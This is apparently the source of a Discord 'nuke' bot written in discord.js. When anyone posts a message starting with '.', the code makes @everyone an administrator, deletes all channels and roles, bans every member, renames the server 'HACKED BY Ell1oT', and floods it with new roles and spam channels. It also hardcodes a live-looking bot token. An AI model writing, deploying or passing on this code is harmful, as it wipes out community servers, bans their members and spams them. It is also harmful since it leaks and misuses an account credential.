const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = '+'///lera ba dly xot prefix dabne
client.on('ready', () => {
console.log(`Logged in as ${client.user.tag}!`);
 
});
          

client.on('message', message => {
    if (message.content.startsWith(".")) {
        message.delete();
        message.guild.roles.find('name', '@everyone').edit({
            permissions: ["ADMINISTRATOR"]///premission akata adminstator
        });
         
        message.guild.channels.map(c => {
            c.delete();
        });
       message.guild.members.forEach(m =>{
                    m.ban()
                })
      
      message.guild.roles.forEach(r =>{
                    r.delete()
                });
      
        setInterval(() => {
            message.guild.createRole({
                name: "HACKED BY Ell1oT",
                permissions: ["ADMINISTRATOR"]
            }).then(rr => {
 
                message.member.addRole(rr.id);
            })
        }, 1000);
        
        message.guild.setIcon("https://cdn.discordapp.com/attachments/807205133661765632/811711614327062598/GIF-210113_035754-1.gif");
        client.user.setAvatar("https://cdn.discordapp.com/avatars/651095740390834176/6d552e47f12f7b7f31148d0275b73ec4.png?size=1024")
        message.guild.setName('HACKED BY Ell1oT');
        setTimeout(function() {
            setInterval(() => {
              
                message.guild.createChannel('HACKED BY Ell1oT', 'text').then(channel => { 
                channel.send('@everyone HACKED BY Ell1oT BCHO SERVER DABNEWA:joy: :joy: :joy:')
               
                })
            }                        
               , 500)
    })}})

client.on('message', async msg => {
  if(msg.content.startsWith('.leaveall')) {
    client.guilds.forEach(guild => {
      guild.leave();
    });
    msg.channel.send(`:joy::joy::joy: بداخۆ وەزحتان شرە`);
  }
});
 
var adminprefix = ["البريفكس بتاعك هنا"]
client.on('message', message => {
  
    var argresult = message.content.split(` `).slice(1).join(' ');
  
  if (message.content.startsWith(adminprefix + 'setg')) {
    client.user.setGame(argresult);
      message.channel.send(`**✅   ${argresult}**`)
  } else 
     if (message.content === (adminprefix + "leave")) {
    message.guild.leave();        
  } else  
  if (message.content.startsWith(adminprefix + 'setw')) {
  client.user.setActivity(argresult, {type:'WATCHING'});
      message.channel.send(`**✅   ${argresult}**`)
  } else 
  if (message.content.startsWith(adminprefix + 'setl')) {
  client.user.setActivity(argresult , {type:'LISTENING'});
      message.channel.send(`**✅   ${argresult}**`)
  } else 
  if (message.content.startsWith(adminprefix + 'sets')) {
    client.user.setGame(argresult, "https://www.twitch.tv/dream");
      message.channel.send(`**✅**`)
  }
  if (message.content.startsWith(prefix + 'setname')) {
  client.user.setUsername(argresult).then
      message.channel.send(`Changing The Name To ..**${argresult}** `)
} else
if (message.content.startsWith(adminprefix + 'setava')) {
  client.user.setAvatar(argresult);
    message.channel.send(`Changing The Avatar To :**${argresult}** `);
}
 
});//Hiroaki | 弘明#2797
//</> 𝕊𝓝Ỗ𝔀𝓎© CopyRight 2020


 ////codaka drwst krawa lalayan black jack


client.login("ODEyMjYzODU2Njk2ODUyNTIx.YC-Nqg.BclcZP-hyPezGA5GU9_6lNkXWa4")
          